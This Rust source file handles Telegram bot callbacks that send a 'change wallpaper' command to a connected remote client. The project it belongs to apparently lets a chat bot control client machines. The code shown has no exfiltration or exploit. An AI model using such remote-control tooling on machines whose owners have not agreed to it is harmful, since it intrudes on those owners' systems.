use std::sync::Arc;
use teloxide::Bot;
use teloxide::payloads::AnswerCallbackQuerySetters;
use teloxide::prelude::{CallbackQuery, Requester, ResponseResult};
use tokio::sync::Mutex;
use rust_i18n::t;
use crate::app::app::AppState;
use crate::core::command::command::RPTCommand;
use crate::core::enums::command_types::commands::RPTCommandType;
use crate::telegram::callbacks::utils::utils::open_client;
use crate::telegram::dialogs::change_wallpaper::change_wallpaper::{ChangeWallpaper, ChangeWallpaperDialogue};

pub async fn change_wallpaper_callbacks(bot: Bot, q: CallbackQuery, state: Arc<Mutex<AppState>>, dialogue: ChangeWallpaperDialogue, change_wallpaper: ChangeWallpaper) -> ResponseResult<()> {
    if let Some(data) = q.clone().data {
        if data == "send" {
            let client = change_wallpaper.client;
            if !change_wallpaper.data.is_empty() {
                let command = RPTCommand { rpt_type: RPTCommandType::ChangeWallpaper, data: change_wallpaper.data, flags: vec![] };
                client.clone().channel.unwrap().send(command).await.unwrap();
            }
            bot.answer_callback_query(q.id.clone()).show_alert(true).text(t!("alert.wallpapers_changed")).await?;
            open_client(&bot, client.id, state, &q).await;
            dialogue.exit().await.expect("Failed to exit");
        } else if data == "cancel" {
            dialogue.exit().await.expect("Failed to exit");
            open_client(&bot, change_wallpaper.client.id, state, &q).await;
            bot.answer_callback_query(q.id).await?;
        }
    }
    Ok(())
}